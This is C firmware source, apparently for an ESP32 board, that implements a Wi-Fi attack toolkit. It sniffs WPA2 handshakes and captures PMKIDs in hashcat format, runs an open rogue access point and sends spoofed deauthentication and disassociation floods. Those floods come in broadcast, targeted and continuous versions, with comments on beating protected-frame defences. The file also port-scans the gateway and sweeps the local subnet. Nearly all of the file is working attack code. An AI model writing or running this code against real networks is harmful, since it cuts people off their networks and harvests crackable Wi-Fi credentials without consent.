#include "wifi_attacks.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include <fcntl.h>
#include <sys/select.h>
#include <string.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

/* TAG removed — unused in this translation unit */

static bool is_sniffing    = false;
static bool deauth_running = false;  // flag to stop continuous deauth
static bool audit_do_sweep = false;  // set by wifi_cmd_connect_and_audit

// Helper to convert binary payload to hex string and print via Serial
static void print_hex_frame(uint8_t *payload, uint16_t len, uint16_t max_len) {
    uint16_t send_len = len > max_len ? max_len : len;
    printf("RES:RAW:");
    for (int i = 0; i < send_len; i++) {
        printf("%02x", payload[i]);
    }
    printf("\n");
}

static uint32_t s_last_beacon_ms = 0;

// Promiscuous callback for sniffing EAPOL and Beacons
void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!is_sniffing) return;

    if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        uint8_t *payload = pkt->payload;
        uint16_t len = pkt->rx_ctrl.sig_len;

        if (len < 24) return;

        uint8_t fc0 = payload[0]; // frame control byte 0
        uint8_t fc1 = payload[1]; // frame control byte 1

        // 1. Beacon frames (0x80) - throttle to 1 per 5 seconds
        if (fc0 == 0x80) {
            uint32_t now = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
            if ((now - s_last_beacon_ms) > 5000) {
                s_last_beacon_ms = now;
                print_hex_frame(payload, len, 200);
            }
            return;
        }

        // 2. Data frames - check for EAPOL
        uint8_t frame_type    = fc0 & 0x0C;
        uint8_t frame_subtype = (fc0 >> 4) & 0x0F;
        if (frame_type == 0x08) {
            // QoS subtypes (8-15) have 2 extra bytes in header
            int hdr_len = ((frame_subtype & 0x08) != 0) ? 26 : 24;
            // WDS (both To-DS and From-DS) adds 6 more bytes
            if ((fc1 & 0x03) == 0x03) hdr_len += 6;

            // Search for EAPOL signature 88 8E within first 30 bytes after header
            int search_end = hdr_len + 30;
            if (search_end > (len - 1)) search_end = len - 1;
            for (int i = hdr_len; i < search_end; i++) {
                if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
                    // EAPOL found — send FULL frame up to 500 bytes
                    print_hex_frame(payload, len, 500);
                    return;
                }
            }
        }
    }
}

void wifi_attacks_init(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      ESP_ERROR_CHECK(nvs_flash_erase());
      ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
}

void wifi_cmd_scan(void) {
    printf("RES:SCAN:START\n");
    esp_wifi_set_mode(WIFI_MODE_STA);
    
    wifi_scan_config_t scan_config = {
        .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true
    };
    esp_wifi_scan_start(&scan_config, true);
    
    uint16_t number = 20;
    wifi_ap_record_t ap_info[20];
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_records(&number, ap_info);
    esp_wifi_scan_get_ap_num(&ap_count);
    
    for (int i = 0; i < number; i++) {
        // RES:SCAN_AP:<SSID>|<BSSID>|<CHANNEL>|<RSSI>|<AUTH>
        printf("RES:SCAN_AP:%s|%02x:%02x:%02x:%02x:%02x:%02x|%d|%d|%d\n", 
               ap_info[i].ssid, 
               ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2], 
               ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5],
               ap_info[i].primary, ap_info[i].rssi, ap_info[i].authmode);
    }
    printf("RES:SCAN:END\n");
}

void wifi_cmd_sniff_start(uint8_t channel) {
    is_sniffing = true;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    printf("RES:SNIFF:STARTED:%d\n", channel);
}

void wifi_cmd_sniff_stop(void) {
    is_sniffing = false;
    esp_wifi_set_promiscuous(false);
    printf("RES:SNIFF:STOPPED\n");
}

/* -----------------------------------------------------------------------
 * PMKID Hunt — passive capture of EAPOL Message 1 PMKID
 *
 * The AP sends the PMKID in the Key Data of EAPOL Message 1 (4-way handshake).
 * This requires NO connected client — just sniff association traffic.
 * PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA-MAC)
 *
 * hashcat format: pmkid*apmac*stamac*ssid_hex  (-m 22000)
 * ----------------------------------------------------------------------- */
static volatile bool pmkid_hunting = false;

static void pmkid_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pmkid_hunting) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = pkt->payload;
    uint16_t len     = pkt->rx_ctrl.sig_len;
    if (len < 40) return;

    /* Search for EAPOL marker 88 8E anywhere in the frame
     * (handles both non-QoS and QoS Data, encrypted headers, etc.) */
    int eapol_off = -1;
    for (int i = 0; i < (int)len - 30; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapol_off = i + 2;
            break;
        }
    }
    if (eapol_off < 0) return;

    /* EAPOL header: version(1) type(1) body_len(2) */
    if (eapol_off + 4 > len) return;
    if (payload[eapol_off + 1] != 0x03) return;  /* must be EAPOL-Key (type 3) */

    int key_off = eapol_off + 4;
    if (key_off + 95 > len) return;

    /* Key Descriptor Type: 0x02 = RSN (WPA2) */
    if (payload[key_off] != 0x02) return;

    /* Key Information (big-endian 2 bytes) */
    uint16_t key_info = ((uint16_t)payload[key_off+1] << 8) | payload[key_off+2];
    bool ack = (key_info & 0x0080) != 0;  /* bit 7 = ACK */
    bool mic = (key_info & 0x0100) != 0;  /* bit 8 = MIC */
    if (!ack || mic) return;               /* Only Message 1 has ACK=1, MIC=0 */

    /* Key Data Length at offset 93 from key_off */
    int kdlen_off = key_off + 93;
    if (kdlen_off + 2 > len) return;
    uint16_t kd_len = ((uint16_t)payload[kdlen_off] << 8) | payload[kdlen_off+1];
    int kd_off = kdlen_off + 2;
    if (kd_len < 22 || kd_off + kd_len > len) return;

    /* Search for PMKID KDE: DD 1A 00 0F AC 04 <16 bytes> */
    for (int i = kd_off; i < kd_off + (int)kd_len - 21; i++) {
        if (payload[i]   == 0xDD &&
            payload[i+1] == 0x1A &&
            payload[i+2] == 0x00 &&
            payload[i+3] == 0x0F &&
            payload[i+4] == 0xAC &&
            payload[i+5] == 0x04)
        {
            uint8_t *pmkid  = &payload[i + 6];
            /* In Data fromDS=1: Addr1=DA(STA) at [4], Addr2=BSSID(AP) at [10] */
            uint8_t *sta_mac = &payload[4];
            uint8_t *ap_mac  = &payload[10];

            printf("RES:PMKID:%02x:%02x:%02x:%02x:%02x:%02x|%02x:%02x:%02x:%02x:%02x:%02x|",
                ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
            for (int j = 0; j < 16; j++) printf("%02x", pmkid[j]);
            printf("\n");
            fflush(stdout);
            return;
        }
    }
}

void wifi_cmd_pmkid_hunt(uint8_t channel) {
    pmkid_hunting = true;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&pmkid_promisc_cb);
    esp_wifi_set_promiscuous(true);
    printf("RES:PMKID_HUNT:STARTED:%d\n", channel);
    fflush(stdout);
}

void wifi_cmd_pmkid_stop(void) {
    pmkid_hunting = false;
    esp_wifi_set_promiscuous(false);
    printf("RES:PMKID_HUNT:STOPPED\n");
    fflush(stdout);
}


void wifi_cmd_rogue_ap(const char* ssid) {
    esp_wifi_set_mode(WIFI_MODE_AP);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen(ssid),
            .channel = 6,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
        },
    };
    strncpy((char *)ap_config.ap.ssid, ssid, sizeof(ap_config.ap.ssid));
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    printf("RES:ROGUE:STARTED:%s\n", ssid);
}

void wifi_cmd_rogue_ap_stop(void) {
    esp_wifi_set_mode(WIFI_MODE_STA);
    printf("RES:ROGUE:STOPPED\n");
}

/* -----------------------------------------------------------------------
 * wifi_cmd_deauth — bidirectional 802.11 deauthentication + disassociation
 *
 * Improvements v2:
 *  1. esp_wifi_set_max_tx_power(84) — pushes ESP32 to ~21 dBm (legal max).
 *  2. Sends BOTH Deauth (0xC0) AND Disassoc (0xA0) frames — dual pressure.
 *  3. 500 frames × 5 ms = ~2.5 seconds, higher pps than before.
 *  4. Sequence number incremented to avoid duplicate-frame filtering.
 *  5. Promiscuous mode enabled (required for esp_wifi_80211_tx on TTGO).
 * ---------------------------------------------------------------------- */
void wifi_cmd_deauth(uint8_t *bssid, uint8_t channel) {
    // Step 1: max TX power + channel
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_max_tx_power(84);          // FIX 1: 84 = 21 dBm (ESP-IDF unit: 0.25dBm steps)
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Step 2: promiscuous required for raw 80211 TX on TTGO
    esp_wifi_set_promiscuous(true);
    vTaskDelay(50 / portTICK_PERIOD_MS);

    /* --- Deauthentication frame (26 bytes) ---
     * FC=0xC000, Reason 7 = Class 3 frame from nonassoc STA
     */
    // Dir A: Spoof AP → Broadcast (kicks ALL clients)
    uint8_t deauth_bcast[26] = {
        0xc0, 0x00,
        0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // DA: Broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: AP (filled)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP (filled)
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauth_bcast[10], bssid, 6);
    memcpy(&deauth_bcast[16], bssid, 6);

    // Dir B: Spoof Client → AP (wipes AP association table entry)
    uint8_t deauth_cli[26] = {
        0xc0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // DA: AP (filled)
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // SA: broadcast spoof
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP (filled)
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauth_cli[4],  bssid, 6);
    memcpy(&deauth_cli[16], bssid, 6);

    /* --- FIX 2: Disassociation frame (0xA0) — Reason 8: STA leaving BSS ---
     * Some devices filter deauth but still obey disassoc. Sending both
     * doubles the chance of forcing a disconnect on stubborn clients.
     */
    uint8_t disassoc_bcast[26] = {
        0xa0, 0x00,                         // FC: Disassociation
        0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x08, 0x00                          // Reason 8: STA leaving
    };
    memcpy(&disassoc_bcast[10], bssid, 6);
    memcpy(&disassoc_bcast[16], bssid, 6);

    uint8_t disassoc_cli[26] = {
        0xa0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x08, 0x00
    };
    memcpy(&disassoc_cli[4],  bssid, 6);
    memcpy(&disassoc_cli[16], bssid, 6);

    printf("RES:DEAUTH:STARTING\n");
    fflush(stdout);

    // FIX 3: 500 frames × 5 ms = ~2.5s burst at ~200 pps per frame type
    uint16_t seq = 0;
    for (int i = 0; i < 500; i++) {
        seq += 0x10;
        // Update sequence in all 4 frames
        deauth_bcast[22]   = disassoc_bcast[22]   = (uint8_t)(seq & 0xFF);
        deauth_bcast[23]   = disassoc_bcast[23]   = (uint8_t)(seq >> 8);
        deauth_cli[22]     = disassoc_cli[22]      = (uint8_t)(seq & 0xFF);
        deauth_cli[23]     = disassoc_cli[23]      = (uint8_t)(seq >> 8);

        // Send all 4 frame types back-to-back
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_bcast,   sizeof(deauth_bcast),   false);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc_bcast, sizeof(disassoc_bcast), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_cli,     sizeof(deauth_cli),     false);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc_cli,   sizeof(disassoc_cli),   false);

        vTaskDelay(5 / portTICK_PERIOD_MS);  // FIX 3: 5 ms gap (was 20 ms)
    }

    esp_wifi_set_promiscuous(false);
    printf("RES:DEAUTH:DONE\n");
    fflush(stdout);
}

/* -----------------------------------------------------------------------
 * FIX 4: wifi_cmd_deauth_targeted — unicast deauth to a SPECIFIC client MAC
 *
 * More effective than broadcast when PMF is "optional":
 *  - Broadcast deauth: AP checks if PMF negotiated with ANY client (may skip)
 *  - Unicast deauth:   Client checks its own PMF state — if optional and the
 *                      specific session didn't negotiate PMF, it OBEYS.
 *
 * Command: CMD:DEAUTH_TARGETED:AP_BSSID:CHANNEL:CLIENT_MAC
 * ----------------------------------------------------------------------- */
void wifi_cmd_deauth_targeted(uint8_t *bssid, uint8_t channel, uint8_t *client_mac) {
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_max_tx_power(84);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    vTaskDelay(50 / portTICK_PERIOD_MS);

    // Deauth: AP → specific client (unicast)
    uint8_t deauth_uni[26] = {
        0xc0, 0x00, 0x00, 0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,  // DA: client (filled)
        0x00,0x00,0x00,0x00,0x00,0x00,  // SA: AP BSSID (filled)
        0x00,0x00,0x00,0x00,0x00,0x00,  // BSSID: AP (filled)
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauth_uni[4],  client_mac, 6);
    memcpy(&deauth_uni[10], bssid,      6);
    memcpy(&deauth_uni[16], bssid,      6);

    // Deauth: client → AP (unicast, spoofing the client)
    uint8_t deauth_rev[26] = {
        0xc0, 0x00, 0x00, 0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,  // DA: AP (filled)
        0x00,0x00,0x00,0x00,0x00,0x00,  // SA: client (filled, spoof)
        0x00,0x00,0x00,0x00,0x00,0x00,  // BSSID: AP (filled)
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauth_rev[4],  bssid,      6);
    memcpy(&deauth_rev[10], client_mac, 6);
    memcpy(&deauth_rev[16], bssid,      6);

    // Disassoc: AP → specific client
    uint8_t disassoc_uni[26] = {
        0xa0, 0x00, 0x00, 0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00, 0x00,
        0x08, 0x00
    };
    memcpy(&disassoc_uni[4],  client_mac, 6);
    memcpy(&disassoc_uni[10], bssid,      6);
    memcpy(&disassoc_uni[16], bssid,      6);

    printf("RES:DEAUTH_TARGETED:STARTING:%02x:%02x:%02x:%02x:%02x:%02x\n",
           client_mac[0],client_mac[1],client_mac[2],
           client_mac[3],client_mac[4],client_mac[5]);
    fflush(stdout);

    uint16_t seq = 0;
    for (int i = 0; i < 500; i++) {
        seq += 0x10;
        deauth_uni[22] = disassoc_uni[22] = deauth_rev[22] = (uint8_t)(seq & 0xFF);
        deauth_uni[23] = disassoc_uni[23] = deauth_rev[23] = (uint8_t)(seq >> 8);

        esp_wifi_80211_tx(WIFI_IF_STA, deauth_uni,    sizeof(deauth_uni),    false);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc_uni,  sizeof(disassoc_uni),  false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_rev,    sizeof(deauth_rev),    false);

        vTaskDelay(5 / portTICK_PERIOD_MS);
    }

    esp_wifi_set_promiscuous(false);
    printf("RES:DEAUTH_TARGETED:DONE\n");
    fflush(stdout);
}

/* -----------------------------------------------------------------------
 * wifi_cmd_deauth_continuous — runs deauth+disassoc in a FreeRTOS task
 * until wifi_cmd_deauth_stop() is called.
 * Improvements: max TX power, disassoc frames, 5ms gap (was 10ms)
 * ---------------------------------------------------------------------- */
typedef struct { uint8_t bssid[6]; uint8_t channel; } deauth_args_t;
static deauth_args_t s_deauth_args;

static void deauth_task(void *pvParam) {
    (void)pvParam;
    uint8_t *bssid   = s_deauth_args.bssid;
    uint8_t  channel = s_deauth_args.channel;

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_max_tx_power(84);           // FIX 1: max TX power
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_log_level_set("wifi", ESP_LOG_NONE); // suppress own-frame warnings
    vTaskDelay(50 / portTICK_PERIOD_MS);

    // Deauth AP→Broadcast
    uint8_t frame_ap[26] = {
        0xc0,0x00,0x00,0x00,
        0xff,0xff,0xff,0xff,0xff,0xff,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00,0x00,0x07,0x00
    };
    memcpy(&frame_ap[10], bssid, 6);
    memcpy(&frame_ap[16], bssid, 6);

    // Deauth Client→AP
    uint8_t frame_cli[26] = {
        0xc0,0x00,0x00,0x00,
        0,0,0,0,0,0,
        0xff,0xff,0xff,0xff,0xff,0xff,
        0,0,0,0,0,0,
        0x00,0x00,0x07,0x00
    };
    memcpy(&frame_cli[4],  bssid, 6);
    memcpy(&frame_cli[16], bssid, 6);

    // FIX 2: Disassoc AP→Broadcast
    uint8_t frame_disassoc[26] = {
        0xa0,0x00,0x00,0x00,
        0xff,0xff,0xff,0xff,0xff,0xff,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00,0x00,0x08,0x00
    };
    memcpy(&frame_disassoc[10], bssid, 6);
    memcpy(&frame_disassoc[16], bssid, 6);

    printf("RES:DEAUTH:CONTINUOUS_START\n");
    fflush(stdout);

    uint16_t seq = 0;
    while (deauth_running) {
        seq += 0x10;
        frame_ap[22]      = frame_cli[22]      = frame_disassoc[22] = (uint8_t)(seq & 0xFF);
        frame_ap[23]      = frame_cli[23]      = frame_disassoc[23] = (uint8_t)(seq >> 8);

        esp_wifi_80211_tx(WIFI_IF_STA, frame_ap,      sizeof(frame_ap),      false);
        esp_wifi_80211_tx(WIFI_IF_STA, frame_disassoc,sizeof(frame_disassoc),false);
        esp_wifi_80211_tx(WIFI_IF_STA, frame_cli,     sizeof(frame_cli),     false);
        vTaskDelay(5 / portTICK_PERIOD_MS);  // FIX 3: 5ms (was 10ms) = ~200 pps
    }

    esp_wifi_set_promiscuous(false);
    esp_log_level_set("wifi", ESP_LOG_WARN);
    printf("RES:DEAUTH:CONTINUOUS_STOP\n");
    fflush(stdout);
    vTaskDelete(NULL);
}

void wifi_cmd_deauth_continuous(uint8_t *bssid, uint8_t channel) {
    if (deauth_running) return;  // already running
    deauth_running = true;
    memcpy(s_deauth_args.bssid, bssid, 6);
    s_deauth_args.channel = channel;
    xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, NULL);
}

void wifi_cmd_deauth_stop(void) {
    deauth_running = false;  // task self-deletes when it sees this
    printf("RES:DEAUTH:STOPPING\n");
    fflush(stdout);
}

/* -----------------------------------------------------------------------
 * Audit port table — 14 common router/service ports
 * ----------------------------------------------------------------------- */
static const uint16_t AUDIT_PORTS[]    = {21,22,23,25,53,80,110,443,445,1900,3306,7547,8080,8443};
static const char*    AUDIT_SERVICES[] = {"FTP","SSH","Telnet","SMTP","DNS","HTTP","POP3","HTTPS","SMB","UPnP","MySQL","TR-069","HTTP-Alt","HTTPS-Alt"};
#define NUM_AUDIT_PORTS 14

/* Try to grab a 1-line HTTP banner. Returns length grabbed. */
static int grab_banner(int sock, char *out, int maxlen) {
    const char *req = "HEAD / HTTP/1.0\r\nHost: router\r\n\r\n";
    send(sock, req, strlen(req), 0);
    int n = recv(sock, out, maxlen - 1, 0);
    if (n < 0) n = 0;
    out[n] = '\0';
    /* Keep only first line, strip CR/LF */
    for (int i = 0; i < n; i++) {
        if (out[i] == '\r' || out[i] == '\n') { out[i] = '\0'; break; }
    }
    return n;
}

/* Scan one port; print RES:AUDIT_PORT:ip:port:OPEN|CLOSED:service:banner */
static void check_port_ex(const char *ip, uint16_t port, const char *service) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_port   = htons(port),
    };
    inet_pton(AF_INET, ip, &dest.sin_addr);

    struct timeval tv = { .tv_sec = 0, .tv_usec = 600000 }; /* 600 ms */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    int err = connect(sock, (struct sockaddr *)&dest, sizeof(dest));
    if (err == 0) {
        char banner[64] = {0};
        if (port == 80 || port == 8080 || port == 8443) {
            grab_banner(sock, banner, sizeof(banner));
        }
        printf("RES:AUDIT_PORT:%s:%d:OPEN:%s:%s\n", ip, port, service, banner);
        fflush(stdout);
    }
    /* CLOSED ports are not printed — reduces serial noise */
    close(sock);
}

/* Determine if a host is up — non-blocking connect + select(150ms).
 *
 * Why not SO_SNDTIMEO?
 *   ESP-IDF lwIP starts the send timeout AFTER ARP resolves.
 *   ARP for a non-existing host retries 4× at 1s each = 4s blocked per probe.
 *
 * Why non-blocking connect + select works:
 *   connect() returns EINPROGRESS immediately.
 *   select() times out after exactly 150ms regardless of ARP state.
 *   Result: dead host = 150ms, live host = ARP+SYN time (typically <50ms).
 *
 * Worst case: 20 hosts × 2 probes × 150ms = 6 seconds total sweep. */
static bool host_alive(const char *ip) {
    const uint16_t probes[] = {80, 443};
    for (int i = 0; i < 2; i++) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;

        /* Set non-blocking */
        fcntl(s, F_SETFL, O_NONBLOCK);

        struct sockaddr_in d = { .sin_family = AF_INET, .sin_port = htons(probes[i]) };
        inet_pton(AF_INET, ip, &d.sin_addr);
        connect(s, (struct sockaddr *)&d, sizeof(d));  /* EINPROGRESS, returns immediately */

        fd_set wset;
        FD_ZERO(&wset);
        FD_SET(s, &wset);
        struct timeval tv = { .tv_sec = 0, .tv_usec = 150000 };  /* 150ms hard cap */

        int sel = select(s + 1, NULL, &wset, NULL, &tv);
        bool alive = false;
        if (sel > 0 && FD_ISSET(s, &wset)) {
            int sock_err = 0;
            socklen_t elen = sizeof(sock_err);
            getsockopt(s, SOL_SOCKET, SO_ERROR, &sock_err, &elen);
            /* sock_err==0 → connected; ECONNREFUSED(111) → host up, port closed */
            alive = (sock_err == 0 || sock_err == ECONNREFUSED);
        }
        close(s);
        if (alive) return true;
    }
    return false;
}


static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                               int32_t event_id, void* event_data) {
    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        char ip[16], gw[16];
        sprintf(ip, IPSTR, IP2STR(&event->ip_info.ip));
        sprintf(gw, IPSTR, IP2STR(&event->ip_info.gw));
        printf("RES:AUDIT_IP:%s|%s\n", ip, gw);
        fflush(stdout);

        /* ── Port scan on gateway ── */
        printf("RES:AUDIT_PORTSCAN_START:%s\n", gw);
        fflush(stdout);
        for (int i = 0; i < NUM_AUDIT_PORTS; i++) {
            check_port_ex(gw, AUDIT_PORTS[i], AUDIT_SERVICES[i]);
            vTaskDelay(20 / portTICK_PERIOD_MS);
        }
        printf("RES:AUDIT_PORTSCAN_DONE\n");
        fflush(stdout);

        /* ── Subnet sweep (DEEP mode only) ── */
        if (!audit_do_sweep) {
            printf("RES:AUDIT_DONE\n");
            fflush(stdout);
            return;
        }

        char subnet_prefix[20];
        snprintf(subnet_prefix, sizeof(subnet_prefix), "%d.%d.%d.",
                 ip4_addr1_16(&event->ip_info.gw),
                 ip4_addr2_16(&event->ip_info.gw),
                 ip4_addr3_16(&event->ip_info.gw));
        /* ── Subnet sweep (DEEP, first 20 hosts) ──
         * Range capped at 20: select()-based probes complete in ~6s worst case.
         * Windows ICS (192.168.137.x) assigns from .2; real devices rarely > .20. */
        printf("RES:AUDIT_SWEEP_START\n");
        fflush(stdout);
        int alive_count = 0;
        for (int i = 1; i <= 20; i++) {
            char target[26];
            snprintf(target, sizeof(target), "%s%d", subnet_prefix, i);

            /* Progress heartbeat every 5 hosts so GUI stays responsive */
            if (i % 5 == 1) {
                printf("RES:AUDIT_SWEEP_PROGRESS:%d/20\n", i);
                fflush(stdout);
            }

            if (strcmp(target, ip) == 0) {
                printf("RES:AUDIT_SWEEP:%s:SELF\n", target);
                fflush(stdout);
                alive_count++;
                continue;
            }
            if (strcmp(target, gw) == 0 || host_alive(target)) {
                printf("RES:AUDIT_SWEEP:%s:ALIVE\n", target);
                fflush(stdout);
                alive_count++;
            }
            /* No extra delay needed — non-blocking probe already returns fast */
            vTaskDelay(5 / portTICK_PERIOD_MS);
        }
        printf("RES:AUDIT_DONE\n");
        fflush(stdout);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        printf("RES:AUDIT_DISCONNECTED\n");
        fflush(stdout);
    }
}

void wifi_cmd_connect_and_audit(const char* ssid, const char* pass, bool do_sweep) {
    audit_do_sweep = do_sweep;         /* store before connecting */
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);

    static bool handler_registered = false;
    if (!handler_registered) {
        esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                            &wifi_event_handler, NULL, NULL);
        esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED,
                                            &wifi_event_handler, NULL, NULL);
        handler_registered = true;
    }

    /* Allow WPA2 or WPA3 */
    wifi_config_t sta_config = {
        .sta = { .threshold = { .authmode = WIFI_AUTH_WPA_WPA2_PSK } }
    };
    strncpy((char *)sta_config.sta.ssid,     ssid, sizeof(sta_config.sta.ssid));
    strncpy((char *)sta_config.sta.password, pass, sizeof(sta_config.sta.password));

    printf("RES:AUDIT_CONNECTING:%s\n", ssid);
    fflush(stdout);
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    esp_wifi_connect();
}

/* -----------------------------------------------------------------------
 * wifi_cmd_scan_device — port-scan a specific host already on the subnet.
 * TTGO must already be connected (call after CMD:AUDIT).
 * Prints RES:DEVICE_PORT:ip:port:OPEN:service:banner for each open port.
 * ----------------------------------------------------------------------- */
static void check_port_device(const char *ip, uint16_t port, const char *service) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_port   = htons(port),
    };
    inet_pton(AF_INET, ip, &dest.sin_addr);

    struct timeval tv = { .tv_sec = 0, .tv_usec = 600000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    int err = connect(sock, (struct sockaddr *)&dest, sizeof(dest));
    if (err == 0) {
        char banner[64] = {0};
        if (port == 80 || port == 8080 || port == 8443) {
            grab_banner(sock, banner, sizeof(banner));
        }
        printf("RES:DEVICE_PORT:%s:%d:OPEN:%s:%s\n", ip, port, service, banner);
        fflush(stdout);
    }
    close(sock);
}

void wifi_cmd_scan_device(const char *ip) {
    printf("RES:DEVICE_SCAN_START:%s\n", ip);
    fflush(stdout);
    for (int i = 0; i < NUM_AUDIT_PORTS; i++) {
        check_port_device(ip, AUDIT_PORTS[i], AUDIT_SERVICES[i]);
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }
    printf("RES:DEVICE_SCAN_DONE:%s\n", ip);
    fflush(stdout);
}

